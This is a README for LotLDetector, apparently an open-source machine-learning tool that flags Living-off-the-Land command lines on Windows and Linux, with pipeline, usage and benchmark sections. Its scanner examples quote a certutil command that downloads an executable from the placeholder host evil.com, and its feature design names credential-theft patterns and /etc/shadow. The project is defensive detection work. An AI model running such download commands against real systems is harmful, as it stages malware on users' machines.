# LotLDetector: Living-off-the-Land (LotL) Attack Detection

LotLDetector is a machine learning-based detection framework for Living-off-the-Land (LotL) command execution across Windows (LOLBAS) and Linux (GTFOBins) environments. It utilizes a hybrid feature extraction pipeline combining domain knowledge bases, regular expressions, and sentence-level BLEU similarity against known attack techniques.

---

## Architecture Overview

```
Raw Command Line (Windows CMD / PowerShell / Linux Bash)
       │
       ▼
Pre-processing & Tokenization
  ├─ CMD Deobfuscation (Caret ^ removal for Windows)
  ├─ IP Range Classification (Loopback, Private, Public)
  └─ Platform-Specific Tokenizer (split_windows / split_linux)
       │
       ▼
Hybrid Feature Extraction
  ├─ Known System Binaries (LOLBins / GTFOBins)
  ├─ Sensitive System Paths (System32, /etc/shadow, /bin/sh...)
  ├─ Behavioral Regular Expressions (Download, Exec, Credential Theft...)
  └─ Sentence BLEU Similarity (Matched against reference attack corpus)
       │
       ▼
Feature Vectorizer (CountVectorizer)
       │
       ▼
Classifier (Balanced Random Forest - 100 Trees)
       │
       ▼
Verdict & Risk Scoring (GOOD / BAD / NEUTRAL)
```

For detailed component interaction and sequence diagrams, see [ARCHITECTURE.md](ARCHITECTURE.md).

---

## Directory Structure

```text
D:\LOTL\
├── ARCHITECTURE.md          # Architecture and pipeline specifications
├── README.md                # Project documentation
├── requirements.txt         # Dependencies
│
├── data/
│   ├── external/            # Reference corpora for BLEU similarity
│   │   ├── cmd_known.corpus
│   │   └── bash_known.corpus
│   ├── raw/                 # Master raw datasets
│   │   ├── windows.csv      # Raw Windows commands (2,121 samples)
│   │   └── linux.csv        # Raw Linux commands (7,495 samples)
│   └── processed/           # Cleaned & stratified splits (80% Train, 10% Val, 10% Test)
│       ├── windows/         # train.csv, val.csv, test.csv
│       └── linux/           # train.csv, val.csv, test.csv
│
├── models/                  # Serialized classifiers and vectorizers
│   ├── windows/             # rf_classifier.joblib, vectorizer.joblib, feature_config.json
│   └── linux/               # rf_classifier.joblib, vectorizer.joblib, feature_config.json
│
├── scripts/                 # CLI entrypoints
│   ├── 01_prepare_dataset.py# Data cleaner and stratified train/val/test splitter
│   ├── 02_train.py          # End-to-end model training pipeline
│   ├── 03_scan_cmd.py       # Command scanner (interactive prompt & CLI flag mode)
│   └── 04_evaluate_test.py  # Unseen test set evaluation
│
└── src/                     # Core library
    ├── preprocessing/       # Normalizer, IP classifier, and tokenizers
    ├── features/            # Feature generators, regex rules, similarity
    ├── models/              # Trainer and predictor implementations
    └── utils/               # Performance evaluation metrics
```

---

## Getting Started

### 1. Requirements

Install standard dependencies:
```bash
pip install -r requirements.txt
```

---

## Step-by-Step Execution

### Step 1: Prepare and Split Datasets (`01_prepare_dataset.py`)

Cleans raw data, deduplicates commands, and generates stratified 80% train, 10% validation, and 10% test splits:

```bash
# Windows
python scripts/01_prepare_dataset.py --platform windows

# Linux
python scripts/01_prepare_dataset.py --platform linux
```

Output files are saved to `data/processed/windows/` and `data/processed/linux/`.

---

### Step 2: Train Detection Models (`02_train.py`)

Extracts hybrid features, vectorizes text labels, and trains a Balanced Random Forest model:

```bash
# Train Windows model
python scripts/02_train.py --platform windows --n-estimators 100

# Train Linux model
python scripts/02_train.py --platform linux --n-estimators 100
```

Trained models and feature importances are saved to `models/windows/` and `models/linux/`.

---

### Step 3: Scan Commands (`03_scan_cmd.py`)

#### Interactive Prompt (REPL Mode)
Run without arguments to enter an interactive shell:
```bash
python scripts/03_scan_cmd.py --platform windows
```
```text
LotLDetector interactive mode [windows]
Type a command and press Enter to scan. Type 'exit' to quit.

>>> certutil.exe -urlcache -split -f http://evil.com/m.exe m.exe
============================================================
Command     : certutil.exe -urlcache -split -f http://evil.com/m.exe m.exe
Verdict     : BAD
Probability : 0.9850
Features    : COMMAND_CERTUTIL.EXE certutil_downloader LOOKS_LIKE_KNOWN_LOL
============================================================

>>> dir C:\Users
============================================================
Command     : dir C:\Users
Verdict     : GOOD
Probability : 0.0100
Features    : (none)
============================================================

>>> exit
```

#### Single Command or Batch Mode
```bash
# Single command scan
python scripts/03_scan_cmd.py --platform windows --cmd "certutil.exe -urlcache -split -f http://evil.com/malware.exe payload.exe"

# Batch scan from file
python scripts/03_scan_cmd.py --platform windows --file commands_list.txt
```

---

### Step 4: Evaluate Test Sets (`04_evaluate_test.py`)

Evaluate model performance on unseen, stratified test sets:

```bash
# Evaluate Windows test set
python scripts/04_evaluate_test.py --platform windows

# Evaluate Linux test set
python scripts/04_evaluate_test.py --platform linux
```

---

## Benchmark Results

Evaluated on unseen, stratified test sets:

| Platform | Test Samples | Accuracy | Precision (Bad) | Recall (Bad) | F1-Score (Bad) | Weighted F1 |
| :--- | :---: | :---: | :---: | :---: | :---: | :---: |
| **Windows** | 213 | **95.31%** | **86.54%** | **91.84%** (45/49) | **0.8911** | **0.9500** |
| **Linux** | 750 | **95.47%** | **73.85%** | **71.64%** (48/67) | **0.7273** | **0.9500** |

---

## References

- **LOLBAS Project**: https://lolbas-project.github.io
- **GTFOBins Project**: https://gtfobins.github.io
- **Adobe libLOL**: https://github.com/adobe/libLOL (Apache-2.0 License)
- **MITRE ATT&CK**: T1218 (System Binary Proxy Execution), T1059 (Command and Scripting Interpreter), T1003 (Credential Dumping)
